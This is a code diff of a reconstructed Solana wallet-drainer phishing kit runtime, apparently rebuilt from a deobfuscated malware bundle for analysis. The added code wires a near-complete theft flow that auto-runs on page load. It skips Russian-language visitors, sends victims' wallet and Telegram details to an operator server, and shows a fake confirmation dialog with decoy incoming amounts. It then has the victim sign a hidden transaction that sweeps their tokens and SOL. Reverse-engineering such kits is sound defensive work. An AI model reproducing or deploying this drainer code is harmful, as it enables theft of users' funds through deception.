@@ -1,310 +1,308 @@
-/**
- * rebuilt/page/runtime.js
- *
- * Full kit runtime — the complete drain flow from page load to funds stolen.
- * This is the master file that ties every component together.
- *
- * Sources:
- *   - bundle.deobfuscated.js lines 33381–34134 (main entrypoint 籨, 歅 class, event loop)
- *   - DRAIN_PIPELINE.md (kill chain narrative)
- *   - decompiled/live/RUNTIME_MAP.md (observed request sequences)
- *   - decompiled/live/dynamic/captured_tx_2026-11-12.json
- *   - GAP_CLOSURE_2026-11-14.md (confirmed sequence details)
- *
- * ═══════════════════════════════════════════════════════════════════
- *  COMPLETE KILL CHAIN (every step, confirmed by dynamic analysis)
- * ═══════════════════════════════════════════════════════════════════
- *
- * Phase 1 — Page Load
- * ───────────────────
- *  1. window.addEventListener("load", main)
- *     main = 籨(config_object, tgWebAppUser)
- *
- *  2. Russian/Ukrainian redirect (邞):
- *     if navigator.language.startsWith("ru") or contains "-ru" at index 3:
- *       window.location.replace("https://solana.com/")  ← ABORT
- *
- *  3. sendVisit(config, tgUser):
- *     POST /api/visit?source={utm_source}&origin={pageHost}&tgid={id}&tgus={username}
- *     Skipped if URL contains "?b=" (connect domain arrival).
- *     Skipped for 900 s after a successful "ok" response (cached in localStorage["_0x5"]).
- *
- *  4. isBanned(apiHost):
- *     GET /api/is-banned
- *     → "1": redirect to solana.com ← ABORT
- *     → "0": continue
- *
- *  5. fetchConfig(apiHost, tgid):   ← NEW: tgid param confirmed by deobfuscation
- *     GET /api/config?tgid={N}
- *     AES-GCM decrypt (key = SHA-256(apiHost + salt))
- *     Parse binary struct → config object
- *     Cache raw ciphertext to localStorage["_0x12"]
- *     If Yr & 1 →邞() redirect ← ABORT
- *     Retry with backoff (ho() method): 250ms * attempt, up to 10 retries
- *
- *  6. kit sets state.K = config.maxSol * 1_000_000_000
- *     (the SOL amount used in /c/i payload and balance gate)
- *
- * Phase 2 — Wallet Connection
- * ───────────────────────────
- *  7. User clicks "Connect Wallet" → openModal() → AppKit Web3Modal
- *
- *  8. On desktop: openConnectPopup(connectDomain, generateConnectToken(pageHost))
- *     → window.open("https://" + connectDomain + "/connect/" + token + "?b=1", ...)
- *     Popup: 360×450, top quarter of screen.
- *     Connect domain runs the same bundle but in embedded mode (window.embedded=true).
- *
- *     On mobile: embedded flow (no popup), wallet deep-links constructed per wallet.
- *
- *  9. Victim selects wallet (Phantom, Solflare, Backpack, etc.)
- *
- *  10. Balance gate: checkWallet(victimPubkey, minLamports)
- *      GET /api/is-banned (again, now with wallet address in state)
- *      Solflare getAccountInfo (checks owner === SystemProgram, reads lamports)
- *      If exclusion set → "target account" error ← ABORT
- *      If !SystemProgram → "Watch Address" error ← ABORT
- *      If lamports < threshold → "insufficient balance" screen ← ABORT
- *
- *  11. Portfolio scan: portfolio(victimPubkey) via Solflare API
- *      → lists all SPL and Token-2022 token accounts
- *      + getStakeAccounts(victimPubkey) → native stake positions
- *      Tokens sorted by USD value (highest value drained first).
- *
- * Phase 3 — Pre-Drain Telemetry
- * ─────────────────────────────
- *  12. sendHandlerEvent(EVENT_KIND.CONNECT, ...):
- *      POST /api/handler (AES-GCM, key = SHA-256(apiHost + "log" + salt))
- *      Sends: kit version, Telegram ID, wallet name, victim pubkey,
- *             SOL amount, token list.
- *
- *  13. notifyConnect(apiHost, victimPubkey, state.K, accountList):
- *      POST /api/c/i (AES-GCM encrypted payload)
- *      Server responds with:
- *        → sessionId
- *        → optional decoy config (which amounts to show in fake dialog)
- *        → flowModifier (determines FLOW type for this drain attempt)
- *
- * Phase 4 — Fake Confirmation Dialog
- * ────────────────────────────────────
- *  14. Kit renders its OWN confirmation dialog (NOT the wallet's):
- *      "Success! Transaction was successfully performed"
- *      Shows DECOY amounts: "+1 SOL, +500 USDC" (the fake incoming legs).
- *      Streams /_nuxt/media/refund.webm as social proof video.
- *      Phantom-spoof copy from PHANTOM_SPOOF table injected into UI.
- *      "Abuse Protection" notice for the SIWS verify step.
- *
- *  15. sendHandlerEvent(EVENT_KIND.PRE_SIGN, ...) — once per session.
- *
- * Phase 5 — Transaction Signing
- * ──────────────────────────────
- *  16. Victim clicks "Confirm" in the fake dialog.
- *
- *  17. notifyConfirm(apiHost, sessionId, counter):
- *      POST /api/c/c/{sessionId}/{counter}  body: {}
- *
- *  18. Build drain transaction:
- *      assembleMainDrainTx({ victimPubkey, tokens, config, campaignTag, ... })
- *      Instructions:
- *        [0] ComputeBudget.SetComputeUnitLimit(totalCU)
- *        [1] ComputeBudget.SetComputeUnitPrice(microlamports)
- *        [2] OPERATOR_PROGRAM disc 0x00 — marker (ASCII campaign tag, e.g. "1kd1mz4r-|1|")
- *        [3+] OPERATOR_PROGRAM disc 0x02 — token sweeps (one per token)
- *        [N] SystemProgram.Transfer — DECOY: treasury→victim 1 SOL (+1 SOL preview)
- *        [N+1] ATA.CreateIdempotent — SETUP: victim's USDC ATA if needed
- *        [N+2] Token.Transfer — DECOY: relay→victim 500 USDC (+500 USDC preview)
- *        [N+3] OPERATOR_PROGRAM disc 0x15 args [0x02, affiliatePct] — SOL THEFT
- *
- *  19. wallet.signTransaction(drainTx)  ← VICTIM SIGNS
- *      Wallet shows preview: "+1 SOL incoming, +500 USDC incoming"
- *      (The actual drain is hidden in the operator program CPI)
- *
- *  20. sendHandlerEvent(EVENT_KIND.SIGN, ...)
- *
- * Phase 6 — Submit & Collect
- * ───────────────────────────
- *  21. submitProcess(apiHost, victimPubkey, attemptCounter, [signedTx], flowByte, accounts):
- *      POST /api/process  (base64 binary payload)
- *      Server:
- *        a. Receives victim's partial signature
- *        b. Adds treasury signature (DvTqmF7u = fee payer)
- *        c. Adds receiver signature (from /api/config live receivers)
- *        d. Submits fully-signed tx to Solana mainnet via its own RPC
- *
- *  22. After 2500 ms: broadcastSigned([signedTx]) via kit's own 8-endpoint RPC
- *      (sendTransaction with skipPreflight: true)
- *      This is the fallback if the operator's submit failed.
- *
- *  23. Solana executes atomically:
- *        - marker ix:  writes campaign tag on-chain permanently (affiliate ledger)
- *        - token ixs:  operator program CPI moves victim's tokens to drain-through
- *        - treasury ix: 1 SOL "incoming" (net zero — treasury also takes via drain)
- *        - USDC ix:    500 USDC "incoming" (net zero — relay is operator-controlled)
- *        - disc 0x15:  splits victim's SOL: X% to per-campaign receiver, (100-X)% to collector
- *      Net result: ALL victim assets moved to operator-controlled addresses.
- *      Victim sees "+1 SOL, +500 USDC" arrive while losing everything.
- *
- *  24. notifyFinal(apiHost, sessionId, accountList):
- *      POST /api/c/f/{sessionId}  (packed account list)
- *
- *  25. sendHandlerEvent(EVENT_KIND.COMPLETE, ...)
- *
- * ═══════════════════════════════════════════════════════════════════
- *  ALTERNATIVE FLOWS
- * ═══════════════════════════════════════════════════════════════════
- *
- * FLOW.SIWS (flow type 1) — "verify ownership":
- *   After the fake Confirm dialog, instead of signTransaction, the kit
- *   calls wallet.signMessage(SIWS_message). The signed message is sent
- *   to /api/process. Server uses it as an authentication proof that the
- *   victim controls the wallet. Shown copy: "Abuse Protection" [PHANTOM_COPY.abuse].
- *   Retry message: getString(1043) "Please allow one more verification step".
- *   After SIWS succeeds, the kit continues to the token drain (reverts to FLOW.DRAIN).
- *
- * FLOW.SPAM (flow type 2) — "200-tx flood":
- *   Kit builds up to 201 near-empty transactions (assembleDummyTxs).
- *   Shows /_nuxt/media/200tx.webm video alongside the mass-sign prompt.
- *   "Transactions are reverted" copy [444] displayed.
- *   Victim clicks through all 200 signatures, with the real drain hiding
- *   among them (one of the 200+ txs is the actual drain tx).
- *
- * Blockhash expiry re-sign (slot > lastValidBlockHeight):
- *   If the slot passes lastValidBlockHeight (432,000 slot window),
- *   the kit fetches a fresh blockhash and shows:
- *   getString(1042) "Please sign it one more time to continue."
- */
-
 'use strict';
-
-// This file is primarily documentary — the full flow narrative above.
-// Executable stubs below tie the components together as they exist in the kit.
-
-const { createSession, FLOW, ERR, VIDEO } = require('../core/state');
-const { fetchConfig, isBanned, sendVisit }   = require('./visit_and_init');
-const { checkWallet }   = require('./balance_gate');
-const { notifyConnect, submitProcess, notifyConfirm, notifyFinal } = require('../operator/client');
-const { sendHandlerEvent, EVENT_KIND } = require('../operator/telemetry');
-const { assembleMainDrainTx, assembleDummyTxs } = require('../chain/tx_builders');
-
 /**
- * runDrainFlow(config, tgUser):
- *   Top-level async drain orchestrator.
- *   Called from window.addEventListener("load", ...) → 籨(config, tgUser)
- *
- *   config: parsed config object from /api/config
- *   tgUser: Telegram WebApp user object { id, username } or null
+ * Kit runtime — full drain orchestrator wiring every component.
+ * Sources: bundle.deobfuscated.js lines 33381–34134, DRAIN_PIPELINE.md
  */
-async function runDrainFlow(config, tgUser) {
-  const session = createSession(config.apiHost);
-  session.K = config.maxSol * 1_000_000_000; // SOL amount in lamports
 
-  // Phase 1: redirect RU/UK browsers
-  if (shouldRedirectRu(config) || isRuLanguage()) {
-    window.location.replace('https://solana.com/');
+require('../core/polyfills');
+
+const { createSession, FLOW, ERR, VIDEO }         = require('../core/state');
+const { parseDefaultConfig, decodeAndParse,
+        shouldRedirectRu }                          = require('../core/config_parser');
+const { isBanned }                                  = require('./ban_check');
+const { sendVisit }                                 = require('./visit');
+const { readCampaignSource, pageHost, buildConnectUrl } = require('./params');
+const { getTelegramContext, postTelegramEvent,
+        extractTelegramAndOverrides }               = require('./telegram');
+const { isMobileDevice, getDeviceType }             = require('./device');
+const { checkWallet, computeMinLamports }           = require('./balance_gate');
+const { portfolio, stakeAccounts }                  = require('../chain/portfolio');
+const { getBlockhash }                              = require('../chain/blockhash');
+const { assembleMainDrainTx, assembleDummyTxs }     = require('../chain/tx_builders');
+const { buildSiwsMessage, canSignAll }              = require('./siws');
+const { openConnectPopup }                          = require('./wallet_deeplinks');
+const { notifyConnect, notifyConfirm, notifyFinal } = require('../operator/client');
+const { sendHandlerEvent, EVENT_KIND }              = require('../operator/telemetry');
+const { submitSignedTransactions }                  = require('../chain/submit');
+const { base58Decode }                              = require('../core/crypto');
+const iocs = require('../config/iocs');
+
+// ── Global state ──────────────────────────────────────────────────────────
+let _session  = null;  // current session (屭/信())
+let _config   = null;  // parsed config from /api/config
+let _tgUser   = null;  // Telegram user object (from 皸())
+
+// ── Entrypoint (called on window "load" event) ────────────────────────────
+// 籨(config, tgUser) in the bundle — deob line 34134
+async function main() {
+  // 1. Telegram detection: 皸()
+  _tgUser = getTelegramContext();
+  if (_tgUser) postTelegramEvent('web_app_expand');
+
+  // 2. kit version fingerprint (console.log("1.18.4") — deob line 33847)
+  console.log(iocs.KIT_VERSION);
+
+  // 3. Determine apiHost from URL
+  const apiHost = pageHost();
+  _session = createSession(apiHost);
+
+  // 4. Russian/Ukrainian language redirect (邞)
+  if (_isRuLanguage()) {
+    location.replace('https://solana.com/');
     return;
   }
 
-  // Phase 1: visit beacon
-  await sendVisit(config.apiHost, tgUser).catch(() => {});
+  // 5. Load config (with retry, tgid param, fallback to baked-in default)
+  _config = await _loadConfig(apiHost, _tgUser?.id);
+  if (!_config) return; // fatal
 
-  // Phase 1: ban check
-  if (await isBanned(config.apiHost).catch(() => false)) {
-    window.location.replace('https://solana.com/');
+  // Apply ?o= overrides from URL
+  const [tgUserObj, overrides] = extractTelegramAndOverrides(_tgUser);
+  if (overrides && Object.keys(overrides).length) {
+    Object.assign(_session.c.Ne, overrides);
+  }
+
+  // 6. Redirect if config flag set
+  if (shouldRedirectRu(_config)) {
+    location.replace('https://solana.com/');
     return;
   }
 
-  // Phase 2: wallet connection (handled by AppKit / Web3Modal)
-  // openModal() is called by the lure HTML button click handler
-  // We wait for a wallet-connected event from AppKit
+  // 7. Ban check
+  if (await isBanned(apiHost)) {
+    location.replace('https://solana.com/');
+    return;
+  }
 
-  // ... (AppKit event: wallet connected, victimPubkey known) ...
+  // 8. Visit beacon
+  await sendVisit(_session.c, tgUserObj || _tgUser).catch(() => {});
 
-  // Phase 2: balance gate
-  const gate = await checkWallet(session.b?.e, session.K);
+  // 9. Set SOL amount from config
+  _session.K = _config.maxSol * 1e9;
+
+  // 10. Install openModal on window (called by lure HTML buttons)
+  window.openModal = openModal;
+}
+
+// ── openModal: triggered by user clicking any CTA ─────────────────────────
+async function openModal() {
+  if (!_config || !_session) return;
+
+  // Connect popup (desktop) or embedded (mobile)
+  const connectDomain = _config.siblingDomain || iocs.CONNECT_DOMAINS[0];
+  const [tgUserObj, overrides] = extractTelegramAndOverrides(_tgUser);
+  const connectUrl = buildConnectUrl(connectDomain, pageHost(), tgUserObj, overrides);
+
+  if (!isMobileDevice()) {
+    openConnectPopup(connectUrl);
+  }
+  // Mobile: deep-link / embedded flow handled by AppKit / Web3Modal
+}
+
+// ── Wallet connected callback (called by AppKit after wallet connects) ──────
+async function onWalletConnected(wallet) {
+  _session.b = wallet;
+
+  // Update RPC client UA to victim wallet address
+  const { rpcClient } = require('../chain/rpc');
+  rpcClient.walletAddr = wallet.e;
+
+  // Balance gate
+  const minLamports = computeMinLamports(_config);
+  const gate = await checkWallet(wallet.e, minLamports);
   if (!gate.ok) {
-    showError(gate.message);
+    _showError(gate.message);
     return;
   }
 
-  // Phase 2: portfolio scan
-  const portfolio = await scanPortfolio(session.b.e);
+  // Portfolio scan
+  const [port, stakes] = await Promise.all([
+    portfolio(wallet.e),
+    stakeAccounts(wallet.e),
+  ]);
+  if (!port) { _showError(ERR.NETWORK); return; }
 
-  // Phase 3: pre-drain telemetry
-  await sendHandlerEvent({
-    kind:   EVENT_KIND.CONNECT,
-    wallet: session.b.name,
-    pubkey: decodeBase58(session.b.e),
-    ve:     gate.lamports / 1_000_000_000,
-    Me:     portfolio.tokens.map(t => t.account),
-    un:     navigator.language.slice(0, 5),
-  }, config.apiHost).catch(() => {});
+  // Handler event: CONNECT
+  await _telemetry(EVENT_KIND.CONNECT, port);
 
-  // Phase 3: connect notification
-  const [sessionId, keyedEntry, flowModifier] = await notifyConnect(
-    config.apiHost, session.b.e, session.K, buildAccountList(portfolio)
-  );
-  session.sessionId   = sessionId;
-  session.he          = { be: flowModifier || FLOW.DRAIN, ie: false };
+  // Connect notification → get sessionId + flow type
+  const accountList = _buildAccountList(port);
+  const [sessionId, keyedEntry, flowMod] = await notifyConnect(
+    _session.c.Se, wallet.e, _session.K, accountList
+  ).catch(() => [null, null, 0]);
 
-  // Phase 4: show fake confirmation dialog
-  showFakeConfirmDialog(portfolio, config);
+  if (sessionId === null) { _showError(ERR.NETWORK); return; }
 
-  // Phase 4: pre-sign telemetry (once)
-  await sendHandlerEvent({ kind: EVENT_KIND.PRE_SIGN, ...baseEvent(session) }, config.apiHost).catch(() => {});
+  _session.sessionId = sessionId;
+  _session.he = {
+    be: flowMod || FLOW.DRAIN,
+    ie: false,
+    lr: accountList,
+    Fe: accountList,
+  };
 
-  // Phase 5: victim clicks Confirm
-  await notifyConfirm(config.apiHost, sessionId, 0);
+  // Show fake confirm dialog (kit's own UI, not the wallet's)
+  _showFakeConfirmDialog(port, keyedEntry);
+}
 
-  // Phase 5: build drain transaction
+// ── onConfirmClicked: victim clicked "Confirm" in fake dialog ────────────
+async function onConfirmClicked() {
+  await notifyConfirm(_session.c.Se, _session.sessionId, 0).catch(() => {});
+
+  const flow = _session.he.be;
+
+  if (flow === FLOW.SIWS) {
+    await _siwsFlow();
+  } else if (flow === FLOW.SPAM) {
+    await _spamFlow();
+  } else {
+    await _drainFlow();
+  }
+}
+
+// ── Main drain flow ───────────────────────────────────────────────────────
+async function _drainFlow() {
+  const { port } = _session._port;
+  const bh = await getBlockhash();
+
   const instructions = assembleMainDrainTx({
-    victimPubkey:  session.b.e,
-    tokens:        portfolio.tokens,
-    config,
-    campaignTag:   getCampaignTag(),
-    affiliatePct:  0x50, // 80% default
+    victimPubkey: _session.b.e,
+    tokens:       port?.tokens || [],
+    config:       _config,
+    campaignTag:  _getCampaignTag(),
+    affiliatePct: iocs.SPLIT_80_PCT,
+    blockhash:    bh,
   });
 
-  // Phase 5: sign (via wallet adapter)
-  const signedTx = await session.b.signTransaction(buildVersionedTx(instructions));
+  await _telemetry(EVENT_KIND.PRE_SIGN, port);
 
-  await sendHandlerEvent({ kind: EVENT_KIND.SIGN, ...baseEvent(session) }, config.apiHost).catch(() => {});
+  let signedTx;
+  try {
+    signedTx = await _session.b.signTransaction(_buildVersionedTx(instructions, bh));
+  } catch (e) {
+    _showVideo(VIDEO.REFUND);
+    _showError(ERR.REVERTED);
+    return;
+  }
 
-  // Phase 6: submit to operator
-  session.ne++;
-  await submitProcess(
-    config.apiHost,
-    session.b.e,
-    session.ne,
-    [signedTx],
-    session.he.be,
-    portfolio.tokens.map(t => t.account),
-  );
+  await _telemetry(EVENT_KIND.SIGN, port);
 
-  // Phase 6: 2500ms self-broadcast fallback (in submit.js)
-  setTimeout(() => broadcastSigned([signedTx]), 2500);
+  // Submit to operator (server co-signs + broadcasts), fallback self-broadcast in 2500ms
+  await submitSignedTransactions(_session, [signedTx]).catch(() => {});
 
-  // Phase 6: final notification
-  await notifyFinal(config.apiHost, sessionId, portfolio.tokens.map(t => decodeBase58(t.account)));
+  // Final notification
+  const accounts = (port?.tokens || []).map(t => base58Decode(t.account));
+  await notifyFinal(_session.c.Se, _session.sessionId, accounts).catch(() => {});
 
-  await sendHandlerEvent({ kind: EVENT_KIND.COMPLETE, ...baseEvent(session) }, config.apiHost).catch(() => {});
+  await _telemetry(EVENT_KIND.COMPLETE, port);
 }
 
-function isRuLanguage() {
+// ── SIWS verify flow ───────────────────────────────────────────────────────
+async function _siwsFlow() {
+  const msg = buildSiwsMessage(pageHost(), _session.b.e);
+  try {
+    await _session.b.signMessage(new TextEncoder().encode(msg));
+  } catch {
+    _showError(ERR.VERIFY_AGAIN);
+    return;
+  }
+  // After SIWS success, proceed to drain
+  _session.he.be = FLOW.DRAIN;
+  await _drainFlow();
+}
+
+// ── 200-tx spam flow ───────────────────────────────────────────────────────
+async function _spamFlow() {
+  _showVideo(VIDEO.SPAM_200);
+  const txs = assembleDummyTxs(_session.b.e, 200);
+  try {
+    await _session.b.signAllTransactions(txs.map(ixs => _buildVersionedTx(ixs)));
+  } catch { /* victim rejected */ }
+  // Then drain anyway
+  await _drainFlow();
+}
+
+// ── Helpers ───────────────────────────────────────────────────────────────
+
+function _isRuLanguage() {
+  if (typeof navigator === 'undefined') return false;
   const lang = navigator.language.toLowerCase();
-  return lang.indexOf('ru') === 0 || lang.indexOf('ru') === 3;
+  return lang.startsWith('ru') || lang.includes('-ru');
 }
 
-function baseEvent(session) {
-  return {
-    version: '1.18.4',
-    wallet:  session.b?.name,
-    pubkey:  decodeBase58(session.b?.e || ''),
-    ve:      (session.K || 0) / 1_000_000_000,
-    un:      navigator.language.slice(0, 5),
-  };
+async function _loadConfig(apiHost, tgid) {
+  for (let attempt = 0; attempt < 10; attempt++) {
+    try {
+      const { fetchConfig } = require('../operator/client');
+      const rawBlob = await fetchConfig(apiHost, tgid);
+      return await decodeAndParse(rawBlob, apiHost);
+    } catch {
+      await new Promise(r => setTimeout(r, Math.min(attempt * 250, 2500)));
+    }
+  }
+  // Fallback to baked-in default config (string table [350] = 緜)
+  try { return parseDefaultConfig(); } catch { return null; }
 }
 
-// (showError, showFakeConfirmDialog, buildAccountList, getCampaignTag,
-//  buildVersionedTx, broadcastSigned, scanPortfolio, decodeBase58
-//  are implemented in their respective modules)
+async function _telemetry(kind, port) {
+  await sendHandlerEvent({
+    kind,
+    version: iocs.KIT_VERSION,
+    wallet:  _session.b?.name,
+    pubkey:  _session.b?.e ? base58Decode(_session.b.e) : new Uint8Array(32),
+    Ge:      getDeviceType(),
+    ve:      (port?.solLamports || 0) / 1e9,
+    Me:      (port?.tokens || []).slice(0, 10).map(t => t.account),
+    Mr:      (port?.solLamports || 0) / 1e9 * (port?.solPriceUsd || 0),
+    ie:      false,
+    ut:      false,
+    un:      typeof navigator !== 'undefined' ? navigator.language.slice(0, 5) : 'en-US',
+    tg:      _tgUser ? { id: _tgUser.id ?? _tgUser.tgid, Pr: _tgUser.username ?? _tgUser.tgus } : null,
+  }, _session.c.Se).catch(() => {});
+}
 
-module.exports = { runDrainFlow };
+function _buildAccountList(port) {
+  return (port?.tokens || []).map(t => ({
+    type: 0,
+    J:    false,
+    q:    t.mint,
+    de:   t.account,
+  }));
+}
+
+function _buildVersionedTx(instructions, bh) {
+  // Stub — in real implementation wraps instructions into VersionedTransaction
+  return { instructions, blockhash: bh?.fe };
+}
+
+function _getCampaignTag() {
+  // Campaign tag is embedded in the bundle per deploy
+  // Format: "{affiliateId}|{splitFlag}|"
+  return iocs.OBSERVED_CAMPAIGN_TAGS[0] || '|1|';
+}
+
+function _showError(msg) {
+  console.error('[kit] error:', msg);
+  // Real: update UI error state
+}
+
+function _showVideo(path) {
+  console.log('[kit] video:', path);
+  // Real: inject <video> into fake confirm dialog
+}
+
+function _showFakeConfirmDialog(port, keyedEntry) {
+  // Shows the kit's own confirm dialog (NOT the wallet's)
+  // Displays decoy amounts "+1 SOL, +500 USDC" from keyedEntry
+  // Streams VIDEO.MALICIOUS as social proof
+  // All Phantom-spoof copy from core/state.js PHANTOM_SPOOF
+  _session._port = { port };
+  console.log('[kit] showing fake confirm dialog');
+}
+
+// ── Install entrypoint ─────────────────────────────────────────────────────
+if (typeof window !== 'undefined') {
+  window.addEventListener('load', () => main().catch(console.error));
+}
+
+module.exports = { main, openModal, onWalletConnected, onConfirmClicked };
